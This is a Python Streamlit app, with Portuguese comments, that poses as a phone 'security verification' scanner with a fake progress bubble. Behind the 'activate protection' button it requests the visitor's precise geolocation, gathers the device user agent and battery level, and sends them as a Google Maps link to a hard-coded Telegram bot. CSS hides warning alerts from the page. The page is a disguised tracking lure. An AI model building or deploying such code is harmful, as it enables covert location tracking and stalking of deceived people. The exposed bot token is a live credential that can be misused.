import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONFIGURAÇÕES TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Sistema de Segurança", layout="centered")

# 2. CSS: BOLHA + ESCONDER AVISOS AMARELOS
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    /* ESCONDE AVISOS AMARELOS (WARNINGS) COMPLETAMENTE */
    .stAlert, [data-testid="stNotificationContent"] { display: none !important; }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA DE DADOS DO APARELHO (MODELO E BATERIA)
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_CAPT')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_CAPT')

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

if 'clicou' not in st.session_state:
    st.session_state['clicou'] = False

# Estado Inicial: Bolha em 4%
if not st.session_state['clicou']:
    with caixa_bolha.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. BOTÃO QUE DISPARA O POP-UP DO GOOGLE
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['clicou'] = True

# 6. LÓGICA DE ATIVAÇÃO E MOVIMENTO DOS NÚMEROS
if st.session_state['clicou']:
    # Chama o pop-up de Localização (Aparecerá a tela de precisão)
    loc = get_geolocation() 
    
    # Só começa a mexer os números se o usuário clicou em "Ativar" e os dados chegaram
    if loc and 'coords' in loc:
        # 1. Movimentação dos números dentro da bolha (0% a 100%)
        for p in range(0, 101, 5):
            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.05)
        
        # 2. Coleta das coordenadas finais
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        # 3. Envio para o Telegram
        relatorio = (
            f"🛡️ PROTEÇÃO ATIVADA\n\n"
            f"📱 Modelo: {modelo[:50] if modelo else 'N/A'}\n"
            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        
        # 4. Finalização
        st.success("Localização concluída")
        st.session_state['clicou'] = False
        st.stop()
    else:
        # Se o pop-up apareceu mas a pessoa ainda não clicou em "Ativar", 
        # o app fica em "Wait..." sem mostrar avisos amarelos
        with caixa_bolha.container():
            st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">Wait...</div></div></div>', unsafe_allow_html=True)
        time.sleep(1)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
